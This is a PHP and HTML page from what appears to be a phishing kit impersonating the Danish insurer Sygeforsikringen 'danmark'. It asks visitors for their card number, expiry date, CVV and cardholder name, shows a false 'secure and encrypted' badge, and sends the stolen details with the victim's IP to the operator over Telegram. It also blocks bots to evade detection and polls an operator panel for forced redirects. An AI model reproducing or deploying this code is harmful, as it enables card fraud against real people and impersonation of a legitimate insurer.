<?php
require_once 'config.php';

$ip = getVisitorIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Vérifier automatiquement si c'est un bot AVANT tout traitement
require_once 'auto_bot_blocker.php';
if (isBotVisitor($userAgent, $ip)) {
    autoBlockBot($ip, $userAgent, 'Bot detected on card page');
    http_response_code(403);
    header('Content-Type: text/plain');
    echo "Access Denied";
    exit;
}

// Vérifier si l'IP est bloquée
if (isIPBlocked($ip)) {
    http_response_code(403);
    echo "<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>Access Denied</h1><p>Your access has been restricted.</p></body></html>";
    exit;
}

updateVisitorStatus($ip, 'card', 'online');

$error = '';
$success = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardnumber = $_POST['cardnumber'] ?? '';
    $expiry = $_POST['expiry'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
    $cardname = $_POST['cardname'] ?? '';
    
    if (empty($cardnumber) || empty($expiry) || empty($cvv) || empty($cardname)) {
        $error = 'Alle felter skal udfyldes';
    } else {
        // Préparer le message pour Telegram
        $message = "💳 <b>Nye kortoplysninger</b>\n\n";
        $message .= "🔢 <b>Kortnummer:</b> $cardnumber\n";
        $message .= "📅 <b>Udløbsdato:</b> $expiry\n";
        $message .= "🔐 <b>CVV:</b> $cvv\n";
        $message .= "👤 <b>Navn på kort:</b> $cardname\n";
        $message .= "🌐 <b>IP:</b> $ip\n";
        $message .= "⏰ <b>Tid:</b> " . date('Y-m-d H:i:s');
        
        // Sauvegarder le numéro de carte en session
        $_SESSION['card_number'] = $cardnumber;
        $_SESSION['card_name'] = $cardname;
        
        // Envoyer à Telegram
        if (sendToTelegram($message)) {
            $success = true;
            // Rediriger vers loading immédiatement
            header("refresh:0;url=loading.php");
        } else {
            $error = 'Der opstod en fejl. Prøv venligst igen.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betalingsoplysninger | Sygeforsikringen "danmark"</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="apple-touch-icon" href="apple-touch-icon.png">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="logo">
     <img align="center" border="0" src="https://s3-eu-west-1.amazonaws.com/mimgs/cdn/TWO/2436/thlHNdETFm9fb2KIsG5w_logo_danmark.png" alt="" title="" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: inline-block !important;border: none;height: auto;float: none;width: 100%;max-width: 168px;" width="168"/>
            </div>
            <a href="tel:70109070" class="phone">70 10 90 70</a>
        </div>
    </header>

    <div class="container">
        <?php if ($success): ?>
            <div class="alert" style="background-color: #d4edda; border-color: #c3e6cb; color: #155724;">
                ✓ Dine kortoplysninger er modtaget. Du omdirigeres...
            </div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="alert" style="background-color: #f8d7da; border-color: #f5c6cb; color: #721c24;">
                ⚠ <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <!-- Progress Indicator -->
        <div class="progress-indicator">
            <div class="progress-step">
                <div class="step-circle completed">1</div>
                <div class="step-line completed"></div>
                <div class="step-circle active">2</div>
                <div class="step-line"></div>
                <div class="step-circle">3</div>
            </div>
        </div>

        <h1>Betalingsoplysninger</h1>
        <p class="subtitle">Indtast dine kortoplysninger for at fuldføre processen.</p>

        <!-- Security Badge -->
        <div class="security-badge">
            <div class="security-badge-icon">🔒</div>
            <div class="security-badge-text">Dine betalingsoplysninger er sikre og krypterede</div>
        </div>

        <form method="POST" action="">
            <div class="form-group">
                <label>
                    Kortnummer <span class="required">*</span>
                    <span class="tooltip-icon" data-tooltip="Indtast dit 16-cifrede kortnummer">?</span>
                </label>
                <input type="text" name="cardnumber" required placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number">
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <div class="form-group">
                    <label>
                        Udløbsdato <span class="required">*</span>
                        <span class="tooltip-icon" data-tooltip="Måned/År som vist på kortet">?</span>
                    </label>
                    <input type="text" name="expiry" required placeholder="MM/ÅÅ" maxlength="5" autocomplete="cc-exp">
                </div>

                <div class="form-group">
                    <label>
                        CVV <span class="required">*</span>
                        <span class="tooltip-icon" data-tooltip="3-cifret kode på bagsiden af kortet">?</span>
                    </label>
                    <input type="text" name="cvv" required placeholder="123" maxlength="4" autocomplete="cc-csc">
                </div>
            </div>

            <div class="form-group">
                <label>Navn på kort <span class="required">*</span></label>
                <input type="text" name="cardname" required placeholder="NAVN EFTERNAVN" autocomplete="cc-name">
            </div>

            <button type="submit" class="btn">🔒 Gennemfør sikker betaling</button>
        </form>
    </div>

    <script src="js/card-validation.js"></script>
<script>
// ✅ Send heartbeat immediately when the page loads
document.addEventListener('DOMContentLoaded', () => {
  // First immediate update
  fetch('api/heartbeat.php?page=card');

  // 🔁 Then update every 5 seconds so the visitor stays "online"
  setInterval(() => {
    fetch('api/heartbeat.php?page=page2');
  }, 5000);
});

async function checkForceRedirect() {
  try {
    const response = await fetch('api/check_force_redirect.php');
    const data = await response.json();

    // 🚫 If the visitor is blocked
    if (data.blocked) {
      document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50px'>🚫 You have been blocked from entering</h1>";
      return; // stop everything
    }

    // 🔁 Forced or normal redirection
    if (data.force_redirect && data.url) {
      window.location.href = data.url;
    } else if (data.redirect && data.url) {
      window.location.href = data.url;
    }

  } catch (error) {
    console.error('Redirect check failed:', error);
  }
}

// Run when the page loads
checkForceRedirect();

// Check every 5 seconds
setInterval(checkForceRedirect, 5000);
</script>

</body>
</html>
